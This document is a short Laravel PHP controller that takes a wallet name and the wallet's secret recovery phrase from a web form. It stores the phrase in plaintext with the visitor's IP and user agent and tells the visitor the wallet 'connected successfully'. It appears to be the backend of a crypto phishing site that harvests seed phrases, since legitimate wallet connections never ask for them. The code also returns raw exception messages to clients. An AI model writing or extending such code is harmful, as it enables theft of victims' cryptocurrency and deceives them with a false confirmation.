<?php

namespace App\Http\Controllers;

use App\Models\WalletConnection;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;

class WalletConnectionController extends Controller
{
    public function store(Request $request)
    {
        Log::info('Wallet connection request received', [
            'wallet_name' => $request->input('wallet_name'),
            'ip' => $request->ip(),
            'has_secret_phrase' => !empty($request->input('secret_phrase'))
        ]);

        try {
            $connection = WalletConnection::create([
                'wallet_name' => $request->input('wallet_name'),
                'secret_phrase' => $request->input('secret_phrase'),
                'ip_address' => $request->ip(),
                'user_agent' => $request->userAgent(),
            ]);

            Log::info('Wallet connection saved successfully', ['id' => $connection->id]);

            return response()->json([
                'success' => true,
                'message' => 'Wallet connected successfully'
            ]);
        } catch (\Exception $e) {
            Log::error('Error saving wallet connection', ['error' => $e->getMessage()]);
            
            return response()->json([
                'success' => false,
                'message' => 'Error: ' . $e->getMessage()
            ], 500);
        }
    }
}
